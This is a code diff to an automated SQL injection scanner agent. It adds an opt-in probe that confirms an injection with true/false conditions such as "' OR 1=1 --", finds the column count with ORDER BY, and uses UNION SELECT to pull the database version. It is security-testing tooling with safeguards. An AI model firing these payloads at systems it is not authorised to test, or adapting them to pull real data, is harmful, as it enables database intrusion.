@@ -90,6 +90,15 @@ class SmartSQLiHunter(Specialist, ThoughtLoop):
     CRITICAL_PARAM_HINTS = {
         "id", "user_id", "uid", "account_id", "order_id", "product_id", "item_id", "username"
     }
+    # SGK-2026-0452: the complete, closed set of extraction expressions —
+    # DB metadata version functions only (no user data / credentials / PII).
+    # _version_expr_for_db() derives every extraction expression from this
+    # set; the values are the ONLY expressions ever extracted (test-enforced).
+    NON_SENSITIVE_EXTRACTION_EXPRS = frozenset({
+        "sqlite_version()",
+        "version()",
+        "@@VERSION",
+    })
 
     @classmethod
     def _is_excluded_param(cls, name: str) -> bool:
@@ -193,6 +202,14 @@ INPUT: [Input]
         self._sql_error_observed = False
         self._sql_error_evidence: Dict[str, Any] = {}
         self._response_differential: Dict[str, Any] = {}
+        # SGK-2026-0452: evidence-chain coherence — the error-observation PoC
+        # pair is pinned once observed and never overwritten by later
+        # (successful) probes; impact_probe_records carries the observed
+        # boolean/extraction demonstration facts (shared contract with
+        # injection_evidence_fields.py).
+        self._error_poc_request = ""
+        self._error_poc_response = ""
+        self._impact_probe_records: Dict[str, Any] = {}
         # SGK-2026-0451: deterministic fire-path state (opt-in).
         self._probe_sent = False
         self._last_probe_sent: Optional[bool] = None
@@ -297,6 +314,33 @@ INPUT: [Input]
                     f"{str(_see.get('details', '') or '')} "
                     f"(body: {str(_see.get('body_snippet', '') or '')[:200]})"
                 )
+            # SGK-2026-0452 A-3/A-5 (opt-in, layered on the 0451 fire path):
+            # when the impact-demo gate is on and a real sql_error observation
+            # exists, the evidence body is the RAW observed SQL error response
+            # excerpt — never an LLM claim. This keeps primary evidence
+            # (poc_judge rule 1), the `sql_error` marker match (payout_grade)
+            # and the replay marker (sealed reproduction checker) all anchored
+            # to the same one request. forced_blind keeps its own time-based
+            # signal description (no error-based mixing).
+            evidence_body = evidence_text
+            if self._impact_demo_enabled() and not forced_blind_detection:
+                if bool(result.get("sql_error_observed", False)):
+                    _see = result.get("sql_error_evidence", {})
+                    if not isinstance(_see, dict):
+                        _see = {}
+                    raw_body = str(_see.get("body_snippet", "") or "")
+                    if raw_body:
+                        evidence_body = raw_body
+            # SGK-2026-0452 (opt-in): pin the recorded payload to the
+            # error-observation probe so additional_info matches the impact.
+            info_payload = (result.get("payloads_used") or [""])[-1]
+            if self._impact_demo_enabled() and bool(result.get("sql_error_observed", False)):
+                _see = result.get("sql_error_evidence", {})
+                if not isinstance(_see, dict):
+                    _see = {}
+                _see_payload = str(_see.get("payload", "") or "")
+                if _see_payload:
+                    info_payload = _see_payload
             # SGK-2026-0449 Scope B: observed-request evidence + impact/repro
             # fill for error-based SQLi findings (fail-closed: without a
             # complete sql_error observation everything stays as before).
@@ -321,14 +365,14 @@ INPUT: [Input]
                     request_url=observed.get("request_url") or task.target,
                     request_method=observed.get("request_method") or "",
                     response_status=observed.get("response_status") or 0,
-                    response_body=evidence_text
+                    response_body=evidence_body
                 ),
                 source_agent=self.name,
                 confidence=0.9,
                 tags=["sqli", "smart_agent"],
                 additional_info={
                     "parameter": result.get("param"),
-                    "payload": (result.get("payloads_used") or [""])[-1],
+                    "payload": info_payload,
                     "payloads_used": result.get("payloads_used", []) or [],
                     "tested_params": result.get("tested_params", []),
                     "blind_correlation": blind_correlation,
@@ -374,6 +418,10 @@ INPUT: [Input]
         # params. The base META_KEYS stays untouched when the fire path is
         # off (byte-equivalent default).
         firing_path_enabled = self._firing_path_enabled()
+        # SGK-2026-0452 (opt-in impact demonstration): layered on the 0451
+        # fire path — the demo gate requires firing ON AND the impact probe
+        # flag ON. Default off -> byte-identical 0451 behavior.
+        impact_demo_enabled = self._impact_demo_enabled()
         meta_keys = (
             META_KEYS | {"url_evidence", "detection_mode"}
             if firing_path_enabled
@@ -493,6 +541,9 @@ INPUT: [Input]
         self._sql_error_observed = False
         self._sql_error_evidence = {}
         self._response_differential = {}
+        self._error_poc_request = ""
+        self._error_poc_response = ""
+        self._impact_probe_records = {}
         self._probe_sent = False
         loop_result: Dict[str, Any] = {"status": "not_run", "reason": "no_parameters"}
 
@@ -606,6 +657,17 @@ Original Value: {payload_params.get(param_name, '') if payload_params else ''}
             "poc_request": self._last_poc_request,
             "poc_response": self._last_poc_response,
         }
+        # SGK-2026-0452 (opt-in, layered on the 0451 fire path): pin the
+        # result PoC pair to the ERROR-OBSERVATION probe (A-2) so evidence
+        # URL/status/body and the impact payload/status all belong to ONE
+        # observed request (0451 contradictions ①/④ become structurally
+        # impossible). The pinned pair is used only when the demo gate is on;
+        # otherwise _last_poc_* wins (byte-identical 0451).
+        if impact_demo_enabled and self._sql_error_observed and self._error_poc_request:
+            result["poc_request"] = self._error_poc_request
+            result["poc_response"] = self._error_poc_response
+        if impact_demo_enabled:
+            result["impact_probe_records"] = dict(self._impact_probe_records)
         if firing_path_enabled:
             result["probe_sent"] = self._probe_sent
             result["probe_request_raw"] = self._last_poc_request
@@ -1228,6 +1290,21 @@ History:
         except Exception:  # noqa: BLE001 — settings boundary, fail closed
             return False
 
+    @staticmethod
+    def _impact_demo_enabled() -> bool:
+        """SGK-2026-0452: opt-in switch for the safe impact demonstration
+        probe. Layered on the 0451 fire path — the probe only runs when the
+        firing path is enabled AND the impact probe flag is on. Default off
+        -> existing behavior stays byte-identical."""
+        try:
+            from src.core.config.settings import get_settings
+            settings = get_settings()
+            if not bool(getattr(settings, "sqli_firing_path_enabled", False)):
+                return False
+            return bool(getattr(settings, "sqli_impact_probe_enabled", False))
+        except Exception:  # noqa: BLE001 — settings boundary, fail closed
+            return False
+
     def _prioritize_candidate_params_generic(
         self,
         payload_params: Dict[str, Any],
@@ -1296,6 +1373,11 @@ History:
             }
         if error_type and error_type != "none":
             self._sql_error_observed = True
+            # SGK-2026-0452 A-1: pin THIS error observation's PoC pair; later
+            # (successful) probes must never overwrite it — the evidence
+            # chain (URL/status/body/payload) stays one coherent request.
+            self._error_poc_request = str(obs.get("poc_request", "") or "")
+            self._error_poc_response = str(obs.get("poc_response", "") or "")
             self._sql_error_evidence = {
                 "error_type": error_type,
                 "details": str(error_classification.get("details", "") or ""),
@@ -1339,7 +1421,391 @@ History:
                 f"Probe {payload!r}: Status={status}, Diff={diff_type}, "
                 f"ErrorType={error_type or 'none'}, Body={snippet}"
             )
+        # SGK-2026-0452 (opt-in, layered on the 0451 fire path): the safe
+        # impact demonstration probe runs ONLY after error-based firing
+        # actually observed a SQL error on this parameter (fail-closed: no
+        # sql_error observation -> no demonstration).
+        if self._impact_demo_enabled() and self._sql_error_observed:
+            await self._fire_impact_demonstration_probe(param_name, baseline_value)
         return "\n".join(lines)
+
+    async def _send_demo_probe(self, payload: str) -> Dict[str, Any]:
+        """SGK-2026-0452: send one impact-demonstration probe via the existing
+        GET-only _send_request and record its payload (0449 fill requirement:
+        payloads stay non-empty). Demonstration probes deliberately do NOT
+        touch _last_poc_* / _error_poc_* / sql_error state — the pinned
+        error-observation pair stays fixed (A-1)."""
+        if payload not in self.used_payloads:
+            self.used_payloads.append(payload)
+        return await self._send_request(payload)
+
+    @staticmethod
+    def _quote_close_variants() -> List[str]:
+        """SGK-2026-0452: finite generic set of quote/comment close variants.
+
+        The injection point is a quoted literal; the family covers the common
+        closing contexts around it: no extra parens ('), one paren (')), two
+        parens (')). Every probe appends the comment '--' so a trailing
+        template fragment (e.g. ")) AND deletedAt IS NULL") cannot break the
+        statement. This is the ONLY shape vocabulary of the demonstration
+        probes — no product-specific token is baked in; the variant that
+        yields the first deterministic differential is adopted at runtime
+        (the 1'))-family shapes measured on the real target are members of
+        this family, not hardcoded shapes).
+        """
+        return ["'", "')", "'))"]
+
+    @staticmethod
+    def _boolean_condition_pairs() -> List[Tuple[str, str]]:
+        """SGK-2026-0452: finite generic (true, false) condition pairs for
+        the boolean differential oracle. OR pairs are tried first (they keep
+        the statement well-formed regardless of the base match), then AND
+        pairs — first deterministic differential wins."""
+        return [("OR 1=1", "OR 1=2"), ("AND 1=1", "AND 1=2")]
+
+    @staticmethod
+    def _ordered_close_variants(preferred_close: str = "") -> List[str]:
+        """SGK-2026-0452: close variants in probe order — the adopted close
+        (when the boolean oracle already observed a differential with it)
+        first, then the remaining family in canonical order (dedup)."""
+        ordered: List[str] = []
+        for close in (preferred_close, *SmartSQLiHunter._quote_close_variants()):
+            if close and close not in ordered:
+                ordered.append(close)
+        return ordered
+
+    @staticmethod
+    def _union_padding_literals() -> List[str]:
+        """SGK-2026-0452: finite generic padding literals used to align the
+        UNION SELECT column count. NULL is the type-generic default (untyped
+        in every supported DB, so UNION type coercion cannot fail); the
+        numeric literal 1 is the fallback for apps that reject NULL-padded
+        rows (measured on the real target: UNION rows with >=2 NULL columns
+        are answered with an app-level 500 while literal padding returns
+        the row). Both are plain SQL literals — no product-specific token."""
+        return ["NULL", "1"]
+
+    async def _fire_impact_demonstration_probe(
+        self, param_name: str, baseline_value: Any
+    ) -> None:
+        """SGK-2026-0452 (opt-in, layered on the 0451 fire path): safe impact
+        demonstration probe. Runs ONLY after error-based firing observed a
+        real SQL error on this parameter (guard in _fire_error_based_probe)
+        and only when sqli_impact_probe_enabled AND sqli_firing_path_enabled
+        are on (fail-closed; default off -> byte-identical 0451).
+
+        1. Boolean differential oracle: true/false conditional probes over the
+           generic quote/comment close variant family
+           (_quote_close_variants x _boolean_condition_pairs, comment '--'
+           appended). The FIRST close/condition pair with a deterministic
+           status / row-count / body-length difference is adopted and
+           recorded as human-readable results; the adopted close is reused by
+           the extraction below. No differential anywhere -> observed=False
+           (fail-closed).
+        2. Non-sensitive one-token extraction (generic ORDER BY column-count
+           discovery over the same variant family + UNION SELECT carrying the
+           DB version expression): the extraction is recorded ONLY when the
+           version value actually appears in an observed response body. The
+           expression is derived exclusively from _detect_database_type() via
+           the closed non-sensitive mapping (_version_expr_for_db) — no user
+           data / credentials / PII path.
+
+        Fail-closed: unobserved clauses stay observed=False with empty values;
+        the error_probe record (always present) pins the error observation's
+        payload/status/marker so every status/URL in the impact is honestly
+        attributed to its own request.
+        """
+        base = str(baseline_value if baseline_value is not None else "1")
+        if not base:
+            base = "1"
+        see = self._sql_error_evidence
+        if not isinstance(see, dict):
+            see = {}
+        rd = self._response_differential
+        if not isinstance(rd, dict):
+            rd = {}
+        records: Dict[str, Any] = {
+            "boolean_differential": {
+                "observed": False,
+                "true_probe": "",
+                "true_result": "",
+                "false_probe": "",
+                "false_result": "",
+            },
+            "extraction": {
+                "observed": False,
+                "expr": "",
+                "value": "",
+                "probe": "",
+                "response_excerpt": "",
+            },
+            "error_probe": {
+                "payload": str(see.get("payload", "") or ""),
+                "status": int(rd.get("attack_status", 0) or 0),
+                "marker_excerpt": str(see.get("body_snippet", "") or ""),
+            },
+        }
+
+        # --- 1. boolean differential oracle (true / false conditional) ---
+        # Probe shape = generic quote/comment close variant family, tried in
+        # canonical order; the FIRST close/condition pair with a deterministic
+        # differential is adopted (fail-closed: no differential anywhere ->
+        # observed=False). The adopted close is reused by the extraction.
+        boolean_records, adopted_close = await self._run_boolean_oracle(
+            param_name, base
+        )
+        records["boolean_differential"] = boolean_records
+
+        # --- 2. non-sensitive one-token extraction (own fail-closed gates) ---
+        records["extraction"] = await self._extract_non_sensitive_token(
+            param_name, base, preferred_close=adopted_close
+        )
+
+        self._impact_probe_records = records
+        logger.info(
+            "[%s] Impact demonstration probe: boolean_observed=%s extraction_observed=%s",
+            self.name,
+            records["boolean_differential"]["observed"],
+            records["extraction"]["observed"],
+        )
+
+    async def _run_boolean_oracle(
+        self, param_name: str, base: str
+    ) -> Tuple[Dict[str, Any], str]:
+        """SGK-2026-0452: boolean differential oracle over the quote/comment
+        close variant family.
+
+        For each close variant in canonical order (_quote_close_variants) and
+        each (true, false) condition pair (_boolean_condition_pairs), sends
+        {base}{close} {cond} -- probes via the existing GET-only path and
+        adopts the FIRST pair with a deterministic differential (status
+        difference / JSON row-count difference / body-length difference >=16).
+        Returns (records, adopted_close); the adopted close is reused by the
+        column-count discovery and the UNION extraction. Fail-closed: no
+        differential anywhere -> observed=False and adopted_close=""."""
+        empty = {
+            "observed": False,
+            "true_probe": "",
+            "true_result": "",
+            "false_probe": "",
+            "false_result": "",
+        }
+        for close in self._quote_close_variants():
+            for true_cond, false_cond in self._boolean_condition_pairs():
+                true_probe = f"{param_name}={base}{close} {true_cond} --"
+                false_probe = f"{param_name}={base}{close} {false_cond} --"
+                true_obs = await self._send_demo_probe(true_probe)
+                false_obs = await self._send_demo_probe(false_probe)
+                if self._has_boolean_differential(true_obs, false_obs):
+                    return (
+                        {
+                            "observed": True,
+                            "true_probe": true_probe,
+                            "true_result": self._summarize_probe_result(true_obs),
+                            "false_probe": false_probe,
+                            "false_result": self._summarize_probe_result(false_obs),
+                        },
+                        close,
+                    )
+        return empty, ""
+
+    async def _extract_non_sensitive_token(
+        self, param_name: str, base: str, preferred_close: str = ""
+    ) -> Dict[str, Any]:
+        """SGK-2026-0452: generic non-sensitive one-token extraction.
+
+        ORDER BY column-count discovery over the quote/comment close variant
+        family (the close adopted by the boolean oracle is tried first), then
+        UNION SELECT probes carrying the DB version expression at each column
+        position, assembled with the adopted close:
+        {param}=-1{close} UNION SELECT ... --  (-1 is the standard
+        row-suppressing base so only the UNION row is returned; no user data
+        is selected). Column alignment uses the finite padding literal family
+        (_union_padding_literals: NULL first, literal 1 fallback) so apps
+        that reject NULL-padded rows are still covered. observed=True ONLY
+        when the version value actually appears in a response body and is not
+        pre-existing app content (control check). The expression comes from
+        the closed _version_expr_for_db mapping (DB metadata version functions
+        only); unknown/unsupported DB or an unobserved value -> observed=False
+        (fail-closed, extraction skipped).
+        """
+        empty = {
+            "observed": False,
+            "expr": "",
+            "value": "",
+            "probe": "",
+            "response_excerpt": "",
+        }
+        db_detection = self._sql_error_evidence.get("db_detection", {})
+        if not isinstance(db_detection, dict):
+            db_detection = {}
+        db_type = str(db_detection.get("type", "") or "").lower()
+        expr = self._version_expr_for_db(db_type)
+        if not expr:
+            return empty
+        pattern = self._version_value_pattern(db_type)
+        if not pattern:
+            return empty
+        column_count, close = await self._discover_union_column_count(
+            param_name, base, preferred_close=preferred_close
+        )
+        if column_count <= 0 or not close:
+            return empty
+        compiled = re.compile(pattern)
+        # Control bodies: the version value must not pre-exist in the app's
+        # own responses, nor appear from the injected close shape without the
+        # UNION — otherwise the hit is not attributable to our probe.
+        control_bodies = [
+            str(obs.get("body_snippet", "") or "")
+            for obs in (
+                await self._send_demo_probe(f"{param_name}={base}"),
+                await self._send_demo_probe(f"{param_name}=-1{close} --"),
+            )
+        ]
+        for position in range(1, column_count + 1):
+            for padding in self._union_padding_literals():
+                exprs = [
+                    expr if i == position else padding
+                    for i in range(1, column_count + 1)
+                ]
+                probe = f"{param_name}=-1{close} UNION SELECT {', '.join(exprs)} --"
+                obs = await self._send_demo_probe(probe)
+                snippet = str(obs.get("body_snippet", "") or "")
+                match = compiled.search(snippet)
+                if not match:
+                    continue
+                value = match.group(0)
+                if any(value in body for body in control_bodies):
+                    continue
+                return {
+                    "observed": True,
+                    "expr": expr,
+                    "value": value,
+                    "probe": probe,
+                    "response_excerpt": snippet,
+                }
+        return empty
+
+    async def _discover_union_column_count(
+        self, param_name: str, base: str, preferred_close: str = ""
+    ) -> Tuple[int, str]:
+        """SGK-2026-0452: generic ORDER BY column-count discovery over the
+        quote/comment close variant family (N=1..12).
+
+        Tries each close variant in order (the close adopted by the boolean
+        oracle first, when present) and returns (n, close) for the FIRST
+        variant showing the classic deterministic transition: ORDER BY n is a
+        clean response and ORDER BY n+1 shows a SQL error. (0, "") when no
+        variant shows the transition -> extraction is skipped (fail-closed)."""
+        for close in self._ordered_close_variants(preferred_close):
+            prev_obs: Optional[Dict[str, Any]] = None
+            for n in range(1, 14):  # probe N+1 to detect the 12-column boundary
+                obs = await self._send_demo_probe(
+                    f"{param_name}={base}{close} ORDER BY {n} --"
+                )
+                if (
+                    prev_obs is not None
+                    and not self._looks_like_sql_error_response(prev_obs)
+                    and self._looks_like_sql_error_response(obs)
+                ):
+                    return n - 1, close
+                prev_obs = obs
+        return 0, ""
+
+    @staticmethod
+    def _version_expr_for_db(db_type: str) -> Optional[str]:
+        """SGK-2026-0452: DB version expression for the non-sensitive token
+        extraction, derived generically from _detect_database_type() results.
+        This is the ONLY extraction mapping (values come from the closed
+        NON_SENSITIVE_EXTRACTION_EXPRS set): unknown / unsupported DB ->
+        None (skip extraction entirely)."""
+        return {
+            "sqlite": "sqlite_version()",
+            "mysql": "version()",
+            "postgresql": "version()",
+            "mssql": "@@VERSION",
+        }.get(str(db_type or "").strip().lower())
+
+    @staticmethod
+    def _version_value_pattern(db_type: str) -> Optional[str]:
+        """SGK-2026-0452: regex locating the version expression's value in an
+        observed body (version numbers look like X.Y.Z across the supported
+        DBs). None for unsupported DB types (skip extraction)."""
+        if SmartSQLiHunter._version_expr_for_db(db_type):
+            return r"\d+\.\d+(?:\.\d+)+"
+        return None
+
+    @staticmethod
+    def _looks_like_sql_error_response(obs: Dict[str, Any]) -> bool:
+        """SGK-2026-0452: SQL error signal from one observed response — the
+        diff classification, the error_classification, or HTTP >= 400."""
+        diff = str(obs.get("diff", "") or "").lower()
+        if diff in {"error", "syntax", "schema", "data", "auth"}:
+            return True
+        ec = obs.get("error_classification", {})
+        if isinstance(ec, dict):
+            ec_type = str(ec.get("type", "") or "").lower()
+            if ec_type and ec_type != "none":
+                return True
+        status = int(obs.get("status", 0) or 0)
+        return status >= 400
+
+    @staticmethod
+    def _count_json_rows(body: str) -> int:
+        """SGK-2026-0452: generic row count from a JSON response body — a
+        top-level array, or the first array value of a top-level object
+        (e.g. {"data": [...]}). -1 when the body is not parseable JSON (no
+        row signal)."""
+        text = str(body or "").strip()
+        if not text:
+            return -1
+        try:
+            data = json.loads(text)
+        except (TypeError, ValueError):
+            return -1
+        if isinstance(data, list):
+            return len(data)
+        if isinstance(data, dict):
+            for value in data.values():
+                if isinstance(value, list):
+                    return len(value)
+        return -1
+
+    @staticmethod
+    def _summarize_probe_result(obs: Dict[str, Any]) -> str:
+        """SGK-2026-0452: human-readable observation summary, e.g.
+        "HTTP 200, rows=8, body_len=1234". rows is included only when the
+        body parsed as JSON (fail-closed: never claim unobserved rows)."""
+        status = int(obs.get("status", 0) or 0)
+        snippet = str(obs.get("body_snippet", "") or "")
+        rows = SmartSQLiHunter._count_json_rows(snippet)
+        if rows >= 0:
+            return f"HTTP {status}, rows={rows}, body_len={len(snippet)}"
+        return f"HTTP {status}, body_len={len(snippet)}"
+
+    @staticmethod
+    def _has_boolean_differential(
+        true_obs: Dict[str, Any], false_obs: Dict[str, Any]
+    ) -> bool:
+        """SGK-2026-0452: deterministic differential between the true and
+        false probes — HTTP status differs, or both JSON row counts parse and
+        differ, or the observed body lengths differ by a non-trivial margin
+        (>=16 bytes, far above payload reflection noise)."""
+        t_status = int(true_obs.get("status", 0) or 0)
+        f_status = int(false_obs.get("status", 0) or 0)
+        if t_status != f_status:
+            return True
+        t_rows = SmartSQLiHunter._count_json_rows(
+            str(true_obs.get("body_snippet", "") or "")
+        )
+        f_rows = SmartSQLiHunter._count_json_rows(
+            str(false_obs.get("body_snippet", "") or "")
+        )
+        if t_rows >= 0 and f_rows >= 0 and t_rows != f_rows:
+            return True
+        t_len = len(str(true_obs.get("body_snippet", "") or ""))
+        f_len = len(str(false_obs.get("body_snippet", "") or ""))
+        return abs(t_len - f_len) >= 16
 
     async def _send_request(self, payload: str) -> Dict[str, Any]:
         """実際のリクエストを送信し、結果を返す"""
@@ -1686,11 +2152,19 @@ def _build_sqli_evidence_and_impact(
     kwargs stay empty and impact/reproduction_steps are None — the Finding
     construction then keeps its current fields (bar unchanged). The import
     is function-local to avoid the manager_internal package import cycle.
+
+    SGK-2026-0452 (opt-in, layered on the 0451 fire path): when the impact-demo
+    gate is on, the evidence URL/status and the impact payload are pinned to
+    the ERROR-OBSERVATION probe (result["poc_request"] is already the pinned
+    error pair, A-2) instead of the last payload sent, and the observed
+    impact-probe records are passed through for the enhanced impact fill.
+    Gate off -> byte-identical 0451 calls (no new kwargs).
     """
     # 循環回避のため関数内 import（manager_internal/__init__ が manager 系を推移 import）
     from src.core.agents.swarm.injection.manager_internal.injection_evidence_fields import (
         build_sqli_impact_and_reproduction_steps,
         build_sqli_observed_evidence,
+        parse_observed_request_url,
     )
 
     sql_error_observed = bool(result.get("sql_error_observed", False))
@@ -1700,20 +2174,47 @@ def _build_sqli_evidence_and_impact(
     see = result.get("sql_error_evidence", {})
     if not isinstance(see, dict):
         see = {}
+
+    observed_kwargs: Dict[str, Any] = {}
+    payload_arg = (result.get("payloads_used") or [""])[-1]
+    impact_kwargs: Dict[str, Any] = {}
+    if SmartSQLiHunter._impact_demo_enabled() and sql_error_observed:
+        # SGK-2026-0452 A-4: payload/status/URL pinned to the error
+        # observation probe — the evidence chain must belong to ONE request.
+        error_payload = str(see.get("payload", "") or "")
+        if error_payload:
+            payload_arg = error_payload
+        error_url = parse_observed_request_url(
+            str(result.get("poc_request", "") or ""), target_url
+        )
+        if error_url:
+            observed_kwargs["evidence_request_url"] = error_url
+        try:
+            error_status = int(rd.get("attack_status", 0) or 0)
+        except (TypeError, ValueError):
+            error_status = 0
+        if not isinstance(error_status, bool) and error_status > 0:
+            observed_kwargs["evidence_status"] = error_status
+        impact_kwargs["impact_probe_records"] = (
+            result.get("impact_probe_records") or None
+        )
+
     observed = build_sqli_observed_evidence(
         target_url=target_url,
         poc_request=str(result.get("poc_request", "") or ""),
         poc_response=str(result.get("poc_response", "") or ""),
         attack_status=rd.get("attack_status", 0),
         sql_error_observed=sql_error_observed,
+        **observed_kwargs,
     )
     impact, steps = build_sqli_impact_and_reproduction_steps(
         parameter=result.get("param"),
-        payload=(result.get("payloads_used") or [""])[-1],
+        payload=payload_arg,
         method=observed.get("request_method") if observed else None,
         request_url=observed.get("request_url") if observed else None,
         response_status=observed.get("response_status") if observed else None,
         sql_error_observed=sql_error_observed,
         marker_excerpt=see.get("body_snippet", ""),
+        **impact_kwargs,
     )
     return observed, impact, steps
